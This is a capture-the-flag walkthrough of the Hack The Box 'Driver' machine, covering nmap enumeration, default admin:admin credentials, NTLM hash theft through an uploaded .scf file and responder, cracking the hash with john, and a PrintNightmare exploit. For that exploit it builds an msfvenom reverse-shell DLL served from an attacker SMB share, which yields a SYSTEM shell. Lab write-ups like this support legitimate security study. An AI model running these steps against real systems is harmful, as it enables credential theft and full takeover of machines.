@@ -1,1 +1,128 @@
+# Nmap 
 
+```
+nmap -sC -sV -p- 10.10.11.106 -oA nmap  
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-16 12:18 CDT
+Nmap scan report for 10.10.11.106
+Host is up (0.054s latency).
+Not shown: 65531 filtered ports
+PORT     STATE SERVICE      VERSION
+80/tcp   open  http         Microsoft IIS httpd 10.0
+| http-auth: 
+| HTTP/1.1 401 Unauthorized\x0D
+|_  Basic realm=MFP Firmware Update Center. Please enter password for admin
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
+135/tcp  open  msrpc        Microsoft Windows RPC
+445/tcp  open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
+5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+Service Info: Host: DRIVER; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: 7h03m43s, deviation: 0s, median: 7h03m43s
+| smb-security-mode: 
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2021-10-17T00:23:50
+|_  start_date: 2021-10-15T22:22:09
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 153.17 seconds
+
+```
+
+# Printer website 
+
+![ee8e4a2edf0fd5f84ebb60db805eb0c4.png](:/fa7f525dcf624a40aba762a5d536ad36)
+
+Can login with default creds `admin:admin`
+
+
+## Ntlm_theft 
+
+Other web enumeration does not give us much to work with. We can upload through the Firmware updates page but there is no way to trigger a reverse shell. 
+
+![bdabf344c6ce5389cf2da803d91f6c2f.png](:/5d1481d127b5409d96abe4346bcf48ba)
+
+The web page says there is a "testing team" that reviews the uploads. There is a tool known as ntlm_theft that will generate hash theft files that we can upload. 
+
+https://github.com/Greenwolf/ntlm_theft
+
+![f79859bb3119173fa3ce108195a01ad3.png](:/fe2da4f232e34dbf92e6105956939870)
+
+Now lets start responder and upload the .scf file type as it will be pushed to the top of the stack. Once the user clicks on it, it will capture the user's hash within responder. 
+
+Set up reponder then upload the file
+
+```
+responder -I tun0 -wrf
+```
+
+![75f4032404a63e2d30f870df15828ef8.png](:/d730a25b35be42d086746e755368b214)
+
+
+NTLM hash
+
+```
+tony::DRIVER:a38df4a320495237:2F0AA823C0F1313126A06221751C07AA:010100000000000000890E4EBAC2D70108041314415BF87D0000000002000800390039004700320001001E00570049004E002D0036004F00330059003800560055004F004B0058004E0004003400570049004E002D0036004F00330059003800560055004F004B0058004E002E0039003900470032002E004C004F00430041004C000300140039003900470032002E004C004F00430041004C000500140039003900470032002E004C004F00430041004C000700080000890E4EBAC2D701060004000200000008003000300000000000000000000000002000009FC1DF1D8750E395CA9D47452D648A527CFCED5E5A7AF9146105BF82645F9DFF0A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310034002E003300000000000000000000000000
+```
+
+Now we can crack tony's hash with john
+
+```
+john tony.hash --wordlist=/usr/share/wordlists/rockyou.txt
+
+Password: liltony
+```
+
+We verified the password with smbclient
+
+![95744b53f75d4bd92391eb6006b2361e.png](:/c1607ed68239480c849f8b652b5f9a1a)
+
+# Explotation
+
+Tony has very limited permissions on the shares so we need to find another way in. Since this box is named driver, I searched around for print driver exploits on the web. A common one that was discovered previously this year was known as "PrinterNightmare". There is a metasploit moduel fro this but we will exploit it manually. 
+
+There are a few github pages with different versions of the exploit. 
+
+https://github.com/nemo-wq/PrintNightmare-CVE-2021-34527
+
+We will use cube0x0 POC code. 
+
+https://github.com/cube0x0/CVE-2021-1675
+
+Configure the SMB settings accordingly and also download cube0x0 version of impacket. 
+
+Now we will create our payload with msfvenom
+
+```
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.18 LPORT=9001 -f dll -o reverse.dll
+```
+
+Now use impacket smbserver to host the payload. This exploit will authenticate as the tony user and pull our payload from the malicious share. It will then execute against the print spooler service on the machine and give us a reverse shell. 
+
+```
+python3 smbserver.py evil /root/htb/Boxes/Driver/
+```
+![9ebb74e121fc3dcd83e8542c7221c152.png](:/2abbeefe882948ddb4566b5ef1b9ee63)
+
+Set up a nc listener and run CVE-2021-1675.py against the machine.
+
+```
+python3 CVE-2021-1675.py tony:liltony@10.10.11.106 '\\10.10.14.18\evil\reverse.dll'
+```
+
+![5e0d7ca636077c8b12a97f2a92fdc477.png](:/d43507357fac4561b1dcc1e29855e9fe)
+
+![2e17d120cbe97ca6b36386409e568329.png](:/f92af285405f465783dd281d1eb58d55)
+
+Since the spooler serivce runs with Administrator privlideges, we are returned with a NT/System shell. 
